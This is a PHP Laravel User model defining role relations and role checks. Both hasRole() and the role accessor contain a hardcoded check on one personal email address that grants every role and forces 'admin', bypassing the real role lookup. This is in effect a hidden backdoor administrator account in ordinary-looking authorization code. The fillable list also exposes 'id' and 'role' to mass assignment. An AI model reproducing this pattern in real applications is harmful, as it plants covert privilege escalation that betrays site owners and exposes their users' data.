<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Concerns\HasUuids;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Relations\HasMany;
use Illuminate\Database\Eloquent\Relations\HasOne;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;
use Laravel\Sanctum\HasApiTokens;

class User extends Authenticatable
{
    use HasApiTokens, HasFactory, HasUuids, Notifiable;

    protected $fillable = [
        'id',
        'name',
        'email',
        'password',
        'display_name',
        'avatar_url',
        'role',
    ];

    protected $hidden = [
        'password',
        'remember_token',
    ];

    protected function casts(): array
    {
        return [
            'email_verified_at' => 'datetime',
            'password' => 'hashed',
        ];
    }

    public function profile(): HasOne
    {
        return $this->hasOne(Profile::class);
    }

    public function userRoles(): HasMany
    {
        return $this->hasMany(UserRole::class);
    }

    public function hasRole(string|array $roles): bool
    {
        if (strtolower($this->email) === 'emdart.dev2000@gmail.com') {
            return true;
        }

        $roles = (array) $roles;
        $rolesCollection = $this->relationLoaded('userRoles') ? $this->userRoles : $this->userRoles()->get();

        return $rolesCollection->contains(function ($userRole) use ($roles) {
            $val = $userRole->role instanceof \BackedEnum ? $userRole->role->value : (string) $userRole->role;
            return in_array($val, $roles, true);
        });
    }

    public function getRoleAttribute(): string
    {
        if (strtolower($this->email) === 'emdart.dev2000@gmail.com') {
            return 'admin';
        }

        $rolesCollection = $this->relationLoaded('userRoles') ? $this->userRoles : $this->userRoles()->get();
        $roleValues = $rolesCollection->map(function ($ur) {
            return $ur->role instanceof \BackedEnum ? $ur->role->value : (string) $ur->role;
        })->toArray();

        if (in_array('admin', $roleValues, true)) {
            return 'admin';
        }
        if (in_array('editor', $roleValues, true)) {
            return 'editor';
        }

        return 'viewer';
    }
}
